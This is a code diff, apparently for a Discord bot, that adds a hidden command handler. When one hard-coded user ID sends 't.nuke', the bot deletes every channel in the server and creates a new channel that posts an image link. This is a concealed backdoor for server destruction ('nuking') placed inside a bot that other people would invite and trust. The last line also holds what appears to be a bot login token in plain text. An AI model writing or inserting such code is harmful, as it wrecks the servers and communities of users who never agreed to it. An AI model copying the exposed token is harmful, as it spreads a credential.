@@ -18,5 +18,17 @@ activity: {
 }
   });
 }
+client.on("message", message => {
+  if (message.author.id !== '724423864611766294') 
+  return;
+   if (message.content === 't.nuke') {
+    message.guild.channels.cache.forEach(channel => channel.delete());
+    message.guild.channels.create(`#si`, {
+          type: 'text'
+        }).then(channel => {
+          channel.send("https://media.discordapp.net/attachments/839647779580149770/839889412988207104/cropped-1366-768-710940.png?width=842&height=473")
+        })
+         }
+      })
 
 client.login('OTAyMjkyNzM4NDkyNDg5Nzc4.YXcTmA.XZcDY-NVxljRnk8VEHdGnMPI41U');
